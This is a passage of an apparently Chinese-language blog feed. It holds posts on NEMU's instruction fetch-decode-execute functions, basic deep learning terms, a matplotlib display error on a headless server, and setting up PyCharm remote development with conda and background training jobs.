class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="325-exec_wrapper"><a class="markdownIt-Anchor" href="#325-exec_wrapper"></a> 3.2.5 exec_wrapper()</h3><blockquote><p><strong><code>exec_wrapper()</code> 的执行过程</strong>：</p><p>首先将当前的 <code>eip</code> 保存到全局译码信息 <code>decoding</code> 的成员 <code>seq_eip</code> 中,然后将其地址被作为参数送进<code>exec_real()</code> 函数中。<code>seq</code> 代表顺序的意思, 当代码从 <code>exec_real()</code> 返回时, <code>decoding.seq_eip</code> 将会指向下一条指令的地址.<code>exec_real()</code> 函数通过宏 <code>make_EHelper</code> 来定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> make_EHelper(name) void concat(exec_, name) (vaddr_t *eip)</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>其含义是&quot;定义一个执行阶段相关的helper函数&quot;, 这些函数都带有一个参数<code>eip</code>。NEMU通过不同的helper函数来模拟不同的步骤.</p></blockquote><p>调用了exec_wrapper函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec_wrapper</span><span class="params">(<span class="keyword">bool</span> print_flag)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  decoding.seq_eip = cpu.eip;</span><br><span class="line">  exec_real(&amp;decoding.seq_eip);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取当前cpu的eip，然后执行exec_real函数。</p><h3 id="326-exec_real"><a class="markdownIt-Anchor" href="#326-exec_real"></a> 3.2.6 exec_real()</h3><blockquote><p>在 <code>exec_real()</code> 中:</p><ul><li>首先通过 <code>instr_fetch()</code> 函数(在<code>nemu/include/cpu/exec.h</code>中定义)进行<strong>取指</strong>, 得到指令的第一个字节, 将其解释成 <code>opcode</code> 并记录在全局译码信息 <code>decoding</code> 中；</li><li>根据 <code>opcode</code> 查阅译码查找表, 得到操作数的宽度信息, 并通过调用 <code>set_width()</code> 函数将其记录在全局译码信息 <code>decoding</code> 中；</li><li>调用 <code>idex()</code> 对指令进行进一步的译码和执行。</li></ul></blockquote><p>因为宏定义，exec_real也就是make_EHelper(real)函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_EHelper(name) void concat(exec_, name) (vaddr_t *eip)</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">make_EHelper(real) &#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> opcode = instr_fetch(eip, <span class="number">1</span>);</span><br><span class="line">  decoding.opcode = opcode;</span><br><span class="line">  set_width(opcode_table[opcode].<span class="built_in">width</span>);</span><br><span class="line">  idex(eip, &amp;opcode_table[opcode]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>decoding是保存当前单条命令译码结果的结构体。</p><h4 id="3261-set_width解决问题"><a class="markdownIt-Anchor" href="#3261-set_width解决问题"></a> 3.2.6.1 set_width()（解决问题）</h4><p><strong>set_width函数使用到了width</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_width</span><span class="params">(<span class="keyword">int</span> <span class="built_in">width</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">width</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">width</span> = decoding.is_operand_size_16 ? <span class="number">2</span> : <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  decoding.src.<span class="built_in">width</span> = decoding.dest.<span class="built_in">width</span> = decoding.src2.<span class="built_in">width</span> = <span class="built_in">width</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>set_width函数中表明：如果width设置0，就可能是2字节或4字节；如果不设置就是width的值；就是设置操作数（src+dest）的宽度。</strong></p><h4 id="3262-idex"><a class="markdownIt-Anchor" href="#3262-idex"></a> 3.2.6.2 idex()</h4><p>set_width函数之后执行idex函数，译码+执行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Instruction Decode and EXecute */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">idex</span><span class="params">(<span class="keyword">vaddr_t</span> *eip, opcode_entry *e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* eip is pointing to the byte next to opcode */</span></span><br><span class="line">  <span class="keyword">if</span> (e-&gt;decode)</span><br><span class="line">    e-&gt;decode(eip);</span><br><span class="line">  e-&gt;execute(eip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会调用译码查找表中的相应的译码函数进行操作数的<strong>译码</strong>. 译码函数统一通过宏 <code>make_DHelper</code> 来定义(在 <code>nemu/src/cpu/decode/decode.c</code> 中)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_DHelper(name) void concat(decode_, name) (vaddr_t *eip)</span></span><br></pre></td></tr></table></figure><blockquote><p>它们的名字主要采用 <strong>i386 手册附录 A</strong>中的操作数表示记号, 例如 <code>I2r</code> 表示将立即数移入寄存器, 其中 <code>I</code> 表示立即数, <code>2</code> 表示英文 <code>to</code>, <code>r</code> 表示通用寄存器, 更多的记号请参考 <strong>i386 手册</strong>.译码函数会把指令中的操作数信息分别记录在全局译码信息 <code>decoding</code> 中。</p><p>这些译码函数会进一步分解成各种不同操作数的译码的组合, 以实现操作数译码的解耦. 操作数译码函数统一通过宏 <code>make_DopHelper</code> 来定义 (在 <code>nemu/src/cpu/decode/decode.c</code> 中, <code>decode_op_rm()</code> 除外):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> make_DopHelper(name) void concat(decode_op_, name) (vaddr_t *eip, Operand *op, bool load_val)</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>它们的名字主要采用 <strong>i386 手册附录 A</strong> 中的操作数表示记号. 操作数译码函数会把操作数的信息记录在结构体 <code>op</code> 中, 如果操作数在指令中, 就会通过 <code>instr_fetch()</code> 将它们从 <code>eip</code> 所指向的内存位置取出. 为了使操作数译码函数更易于复用, 函数中的 <code>load_val</code> 参数会控制是否需要将该操作数读出到全局译码信息 <code>decoding</code> 供后续使用. 例如如果一个内存操作数是源操作数, 就需要将这个操作数从内存中读出来供后续执行阶段来使用; 如果它仅仅是一个目的操作数, 就不需要从内存读出它的值了, 因为执行这条指令并不需要这个值, 而是将新数据写入相应的内存位置.</p></blockquote><p><code>idex()</code> 函数中的译码过程结束之后, 会调用译码查找表中的相应的执行函数来进行真正的<strong>执行</strong>操作. 执行函数统一通过宏 <code>make_EHelper</code> 来定义, 它们的名字是指令操作本身. 执行函数通过 RTL 来描述指令真正的执行功能(RTL 将在下文介绍). 其中 <code>operand_write()</code> 函数(在 <code>nemu/src/cpu/decode/decode.c</code> 中定义) 会根据第一个参数中记录的类型的不同进行相应的写操作, 包括写寄存器和写内存.</p><p>从 <code>idex()</code> 返回后, <code>exec_real()</code> 最后会通过 <code>update_eip()</code> 对 <code>eip</code> 进行更新。</p><h3 id="327-指令执行结束后"><a class="markdownIt-Anchor" href="#327-指令执行结束后"></a> 3.2.7 指令执行结束后</h3><p>执行完后，再次返回cpu_exec函数的for循环：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Simulate how the CPU works. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --) &#123;</span><br><span class="line">    <span class="comment">/* Execute one instruction, including instruction fetch,</span></span><br><span class="line"><span class="comment">     * instruction decode, and the actual execution. */</span></span><br><span class="line">    exec_wrapper(print_flag);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环上述流程，直到你指定的步数（c命令是-1，也就是最大值，也就是执行全部）。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://zhong-kangwei.gitee.io/ics-pa-gitbook-2022/pa2/2.1.html" target="_blank" rel="noopener">讲义</a></li><li><a href="http://www.stardustdl.top/posts/learning/nju-icspa-analytics-nemu/" target="_blank" rel="noopener">NJU ICS Programming Assignment 代码分析 - NEMU</a></li><li><a href="https://ilern.github.io/2021/01/12/NJU-ics-2020-%E6%A6%82%E8%A6%81/#%E8%AF%B7%E6%95%B4%E7%90%86%E4%B8%80%E6%9D%A1%E6%8C%87%E4%BB%A4%E5%9C%A8NEMU%E4%B8%AD%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B" target="_blank" rel="noopener">NJU ics 2020 概要</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深度学习中的一些名词</title>
      <link href="/2022/04/22/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%8D%E8%AF%8D/"/>
      <url>/2022/04/22/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-参数"><a class="markdownIt-Anchor" href="#1-参数"></a> 1 参数</h1><h2 id="11-batch"><a class="markdownIt-Anchor" href="#11-batch"></a> 1.1 batch</h2><p>两种解释：</p><ol><li>对于一个有 2000 个训练样本的数据集。将 2000 个样本分成大小为 500 的 <strong>batch</strong>，那么完成一个 <strong>epoch</strong> 需要 4 个 <strong>iteration</strong>。</li><li>如果把准备训练数据比喻成一块准备打火锅的牛肉，那么<strong>epoch</strong>就是整块牛肉，batch就是切片后的牛肉片，<strong>iteration</strong>就是涮一块牛肉片。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">512</span>  <span class="comment"># batch的大小</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/71f31c105879" target="_blank" rel="noopener">深度学习训练之Batch</a></p><h2 id="12"><a class="markdownIt-Anchor" href="#12"></a> 1.2</h2><h1 id="2-网络层"><a class="markdownIt-Anchor" href="#2-网络层"></a> 2 网络层</h1><h2 id="21-嵌入层"><a class="markdownIt-Anchor" href="#21-嵌入层"></a> 2.1 嵌入层</h2><p>嵌入层将词元的索引映射到其特征向量。该层的权重是一个矩阵，其行数等于字典大小（<code>input_dim</code>），列数等于每个标记的向量维数（<code>output_dim</code>）。在词嵌入模型训练之后，这个权重就是我们所需要的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">embed = nn.Embedding(num_embeddings=<span class="number">20</span>, embedding_dim=<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h1 id="3-函数"><a class="markdownIt-Anchor" href="#3-函数"></a> 3 函数</h1><h1 id="4-其他"><a class="markdownIt-Anchor" href="#4-其他"></a> 4 其他</h1><h2 id="41-二元交叉熵损失"><a class="markdownIt-Anchor" href="#41-二元交叉熵损失"></a> 4.1 二元交叉熵损失</h2>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pylab.show()或plt.show()报错</title>
      <link href="/2022/04/22/pylab-show-%E6%88%96plt-show-%E6%8A%A5%E9%94%99/"/>
      <url>/2022/04/22/pylab-show-%E6%88%96plt-show-%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-pylabshow问题"><a class="markdownIt-Anchor" href="#1-pylabshow问题"></a> 1 pylab.show()问题</h1><p>最近使用实验室的机子进行模型训练，<strong>发生报错</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XIO:  fatal IO error 0 (Success) on X server <span class="string">"localhost:13.0"</span></span><br><span class="line">      after 355 requests (355 known processed) with 2 events remaining.</span><br></pre></td></tr></table></figure><p><strong>定位代码</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pylab.show()</span><br></pre></td></tr></table></figure><p><strong>原因</strong>：机子没有界面，导致显示失败。</p><p><strong>解决</strong>：只需将图片保存，而非显示。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pylab.show()</span></span><br><span class="line">pylab.savefig(<span class="string">'./data/net_pic/textcnn_100_0.001_300.jpg'</span>)</span><br></pre></td></tr></table></figure><h1 id="2-pltshow问题"><a class="markdownIt-Anchor" href="#2-pltshow问题"></a> 2 plt.show()问题</h1><p>之前一个同学也遇到了类似的报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UserWarning: Matplotlib is currently using agg, <span class="built_in">which</span> is a non GUI backend, so cannot show the figure.</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>定位代码</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><strong>解决方法</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line">plt.savefig(<span class="string">'./data/net_pic/textcnn_100_0.001_300.jpg'</span>)</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/m0_37052320/article/details/79640467" target="_blank" rel="noopener">python matplotlib 画图保存图片简单例子</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm远程开发</title>
      <link href="/2022/04/21/PyCharm%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
      <url>/2022/04/21/PyCharm%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>最近跑深度学习模型，自己的笔记本吃不消了，于是打算使用实验室的机子。为了提高开发效率，使用PyCharm进行远程开发。</p><h1 id="2-查看远程环境"><a class="markdownIt-Anchor" href="#2-查看远程环境"></a> 2 查看远程环境</h1><ol><li><p>使用<code>MobaXterm</code>软件登陆实验室的机子，并将代码+数据集上传至指定位置；（其实这一步可以不做，在后面使用PyCharm进行同步）</p></li><li><p>查看机子的系统：Centos7</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/os-release</span><br><span class="line">NAME=<span class="string">"CentOS Linux"</span></span><br><span class="line">VERSION=<span class="string">"7 (Core)"</span></span><br><span class="line">ID=<span class="string">"centos"</span></span><br><span class="line">ID_LIKE=<span class="string">"rhel fedora"</span></span><br><span class="line">VERSION_ID=<span class="string">"7"</span></span><br><span class="line">PRETTY_NAME=<span class="string">"CentOS Linux 7 (Core)"</span></span><br><span class="line">ANSI_COLOR=<span class="string">"0;31"</span></span><br><span class="line">CPE_NAME=<span class="string">"cpe:/o:centos:centos:7"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.centos.org/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.centos.org/"</span></span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=<span class="string">"CentOS-7"</span></span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=<span class="string">"7"</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT=<span class="string">"centos"</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=<span class="string">"7"</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="3-配置远程python环境"><a class="markdownIt-Anchor" href="#3-配置远程python环境"></a> 3 配置远程Python环境</h1><ol><li><p>发现机子是使用conda管理python的，查看系统中的所有环境：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) [ccyin@localhost Malware-Detection]$ conda info -e</span><br><span class="line"><span class="comment"># conda environments:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">base                  *  /home/ccyin/miniconda3</span><br><span class="line">junxuan                  /home/ccyin/miniconda3/envs/junxuan</span><br></pre></td></tr></table></figure></li><li><p>创建环境，名称为<code>malware</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create --name malware python=3.9</span><br><span class="line"><span class="comment"># 指定Python版本是3.9（不用管是3.9.x，conda会为我们自动寻找3.9.x中的最新版本）</span></span><br></pre></td></tr></table></figure></li><li><p>激活环境：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) [ccyin@localhost Malware-Detection]$ <span class="built_in">source</span> activate malware</span><br><span class="line">(malware) [ccyin@localhost Malware-Detection]$</span><br></pre></td></tr></table></figure><p>命令行前出现<code>(malware)</code>证明成功激活<code>malware</code>环境</p></li><li><p>查看python版本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(malware) [ccyin@localhost Malware-Detection]$ python --version</span><br><span class="line">Python 3.9.12</span><br></pre></td></tr></table></figure></li><li><p>安装一些库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install torch</span><br><span class="line">pip install torchvision</span><br><span class="line">pip install d2l</span><br></pre></td></tr></table></figure></li><li><p>查看已经安装的库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure></li></ol><h1 id="4-本地代码备份"><a class="markdownIt-Anchor" href="#4-本地代码备份"></a> 4 本地代码备份</h1><p>后期本地与服务器的代码同步，以防万一，把本地代码整到GitHub上。</p><ol><li><p>在项目主目录生成空版本库；</p></li><li><p>由于数据集占空间较大，不上传云端，所以新建<code>.gitignore</code>将一些文件夹进行忽略：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.idea</span><br><span class="line">__pycache__</span><br><span class="line">data</span><br><span class="line">model</span><br></pre></td></tr></table></figure></li><li><p>Github上新建仓库，然后将本地代码push上去。</p></li></ol><h1 id="5-配置pycharm"><a class="markdownIt-Anchor" href="#5-配置pycharm"></a> 5 配置PyCharm</h1><ol><li><p>将本地的<code>Python Interperter</code>更换为远端的，新建python解释器，选择<code>SSH Interpreter</code>，输入IP+用户名+密码：</p><img src="https://s2.loli.net/2022/04/21/mQNWwoLCqUBE3Zi.png" width="800" height="500" alt="图片名称" align="center" id="191"></li><li><p>查找conda虚拟环境<code>malware</code>中的解释器：（<code>3 配置远程Python环境</code>中已经创建好<code>malware</code>虚拟环境）</p><p>首先确定虚拟环境<code>malware</code>的目录：<code>/home/ccyin/miniconda3/envs/malware</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ conda info -e</span><br><span class="line"><span class="comment"># conda environments:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">base                     /home/ccyin/miniconda3</span><br><span class="line">malware               *  /home/ccyin/miniconda3/envs/malware</span><br></pre></td></tr></table></figure><p>然后点开<code>bin</code>，选择<code>python</code>（<strong>注意是<code>python</code>不是<code>python3</code></strong>）</p><img src="https://s2.loli.net/2022/04/21/6VolZ1XPqikx7rB.png" width="750" height="500" alt="图片名称" align="center" id="192"></li><li><p>选择好解释器之后，就要确定项目在服务器上的同步路径，默认是在<code>/tmp/</code>下的文件夹中，现在修改为之前上传的目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(malware) [ccyin@localhost Malware-Detection]$ <span class="built_in">pwd</span></span><br><span class="line">/home/ccyin/zhenlong/Malware-Detection</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/04/21/35wchZX61t7Jqnv.png" width="750" height="500" alt="图片名称" align="center" id="193"></li><li><p>点击确定后，然后在<code>Collectiong files...</code>和<code>Uploading xxx</code>，应该是更新远端文件，因为数据集中有许多文件，所以比较慢；（这样看来，之前上传代码+数据集显得多此一举🥦）</p></li><li><p>更新完毕后，可以<strong>从右边“remote host”中看到服务器上的文件</strong>，而且标绿了，表示其为我们对应的同步路径：</p><img src="https://s2.loli.net/2022/04/22/Mu5KH72ORaS6oQi.png" width="550" height="500" alt="图片名称" align="center" id="194"></li><li><p><strong>要对该文件进行修改时，注意一定要先Download下来</strong>，<strong>不可直接双击点开</strong>。Remote Host里的文件，当你执行非打开操作的时候，所指代的都是服务器上的文件，比如你可以从这里选择下载，进行比对操作等。但是当你从Remote Host双击打开文件时，这时打开的就不是服务器上的，而是一个镜像文件。所以如果直接修改从Remote Host双击打开的文件，修改是无效的。一定要先下载下来，进行修改，然后再上传过去。（<strong>第7步设置自动同步，这样本地的修改会自动上传至远端，但是在远端修改或添加删除文件，不会影响本地</strong>）</p><img src="https://s2.loli.net/2022/04/22/QaDvPkOryYlbmgx.png" width="450" height="250" alt="图片名称" align="center" id="195"></li><li><p>确保工具栏中的<code>Tools/Deployment/Automatic Upload</code>前面有对勾（默认有），这样以来，在本地的修改会自动同步到服务器上，我不需要手动进行上传。</p><img src="https://s2.loli.net/2022/04/22/lVEc6rSKUWR5LPi.png" width="450" height="300" alt="图片名称" align="center" id="196"></li><li><p>此外，如果运行python文件需要使用到命令行参数的时候，可以在<code>Configurations</code>中进行增加：</p><img src="https://s2.loli.net/2022/04/22/yYbOl6i5cxI2zXg.png" width="750" height="400" alt="图片名称" align="center" id="197"></li></ol><h1 id="6-后台运行py脚本"><a class="markdownIt-Anchor" href="#6-后台运行py脚本"></a> 6 后台运行py脚本</h1><p>训练脚本耗时长，使用pycharm直接运行脚本，可能会因为笔记本息屏、断网等因素而中断，所以考虑将脚本挂在后台运行。</p><ol><li><p>使用<code>MobaXterm</code>登陆远程主机；</p></li><li><p>切换到项目目录并激活虚拟机环境；</p></li><li><p>后台运行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(malware) [ccyin@localhost Malware-Detection]$ nohup python -u train_textcnn.py &gt; textcnn.log 2&gt;&amp;1 &amp;</span><br><span class="line">[1] 46583</span><br><span class="line">(malware) [ccyin@localhost Malware-Detection]$ nohup python -u train_rnn.py &gt; rnn.log 2&gt;&amp;1 &amp;</span><br><span class="line">[2] 46823</span><br></pre></td></tr></table></figure></li><li><p>检查下后台是否运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(malware) [ccyin@localhost Malware-Detection]$ ps aux|grep python</span><br><span class="line">...</span><br><span class="line">ccyin     46583 70.4  4.3 67868816 11451892 pts/13 Rl 14:20   1:47 python -u train_textcnn.py</span><br><span class="line">ccyin     46823  129  0.8 41704128 2243816 pts/13 Rl 14:23   0:09 python -u train_rnn.py</span><br></pre></td></tr></table></figure></li><li><p>此时后台成功运行，笔记本断网、关机都不会影响脚本的运行。</p></li></ol><h1 id="7-取消后台运行"><a class="markdownIt-Anchor" href="#7-取消后台运行"></a> 7 取消后台运行</h1><ol><li><p>确定运行脚本的进程ID(<code>6.3</code>中已经给出ID)，也可以通过下面的命令获取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(malware) [ccyin@localhost Malware-Detection]$ ps aux|grep python</span><br><span class="line">...</span><br><span class="line">ccyin     46583 70.4  4.3 67868816 11451892 pts/13 Rl 14:20   1:47 python -u train_textcnn.py</span><br><span class="line">ccyin     46823  129  0.8 41704128 2243816 pts/13 Rl 14:23   0:09 python -u train_rnn.py</span><br></pre></td></tr></table></figure></li><li><p>杀掉进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">kill</span> -9 46583</span><br><span class="line">$ <span class="built_in">kill</span> -9 46823</span><br></pre></td></tr></table></figure></li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.jianshu.com/p/a09a9b40ad20" target="_blank" rel="noopener">Git忽略文件.gitignore的使用</a></li><li><a href="https://zhuanlan.zhihu.com/p/44398592" target="_blank" rel="noopener">Conda使用指南</a></li><li><a href="https://zhuanlan.zhihu.com/p/93236936" target="_blank" rel="noopener">PyCharm远程开发的配置与流程</a></li><li><a href="https://www.jianshu.com/p/4041c4e6e1b0" target="_blank" rel="noopener">linux 下后台运行python脚本</a></li><li><a href="https://blog.csdn.net/lingyunxianhe/article/details/119328987" target="_blank" rel="noopener">nohup后台python3程序及关闭</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL-错误1153：max_allowed_packet</title>
      <link href="/2022/04/20/MySQL-%E9%94%99%E8%AF%AF1153%EF%BC%9Amax_allowed_packet/"/>
      <url>/2022/04/20/MySQL-%E9%94%99%E8%AF%AF1153%EF%BC%9Amax_allowed_packet/</url>
      
